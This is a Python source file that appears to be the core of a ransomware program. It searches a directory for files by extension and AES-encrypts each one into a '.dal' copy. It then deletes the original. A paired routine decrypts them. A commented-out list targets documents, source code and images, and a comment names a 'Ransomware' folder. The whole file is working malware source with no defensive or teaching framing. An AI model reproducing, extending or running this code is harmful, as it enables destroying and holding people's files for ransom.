import os,struct,hashlib
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Search import search
from Get_data import get_key

def encrypt_file(key, in_filename, chunksize=65536):
    out_filename = in_filename+".dal"
    iv = get_random_bytes(16)
    mode = AES.MODE_CBC
    encryptor = AES.new(key,mode,iv)
    filesize = os.path.getsize(in_filename)

    with open(in_filename,'rb') as infile:
        with open(out_filename, 'wb') as outfile:
            outfile.write(struct.pack('<Q', filesize))
            outfile.write(iv)

            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += b' '*(16-len(chunk) % 16)

                outfile.write(encryptor.encrypt(chunk))

    os.unlink(in_filename)

def decrypt_file(key, in_filename, chunksize=24*1024):
    out_filename = os.path.splitext(in_filename)[0]
    with open(in_filename, 'rb') as infile:
        origsize = struct.unpack('<Q',infile.read(struct.calcsize('Q')))
        iv = infile.read(16)
        mode = AES.MODE_CBC
        decryptor = AES.new(key,mode,iv)

        with open(out_filename,'wb') as outfile:
            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                outfile.write(decryptor.decrypt(chunk))
            outfile.truncate(origsize[0])

    os.unlink(in_filename)

def encrypt(default_path):
    password = bytes(get_key(),encoding="utf-8")
    key = hashlib.sha256(password).digest()

    ext_list = [".hwp"]
    '''
    ext_list = [".doc", ".docx", ".hwp", ".c", ".cpp",
    ".java",".ppt", ".pptx", ".pptm", ".jpg",
    ".png", ".jpeg", ".gif", ".bmp", ".txt",".pdf",".html"]
    '''
    file,directory = search(default_path, ext_list)

    for i in file:
        encrypt_file(key,i)

    print("Encrypted Finish!")

def decrypt(default_path):
    password = bytes(get_key(), encoding="utf-8")
    key = hashlib.sha256(password).digest()

    #default_path = os.path.dirname(os.path.realpath(__file__))
    # default_path = "C:\\Users\\oonja\\Desktop\\Ransomware"
    ext_list = [".dal"]
    file, directory = search(default_path, ext_list)

    for i in file:
        decrypt_file(key, i)

    print("Decrypted Finish!")
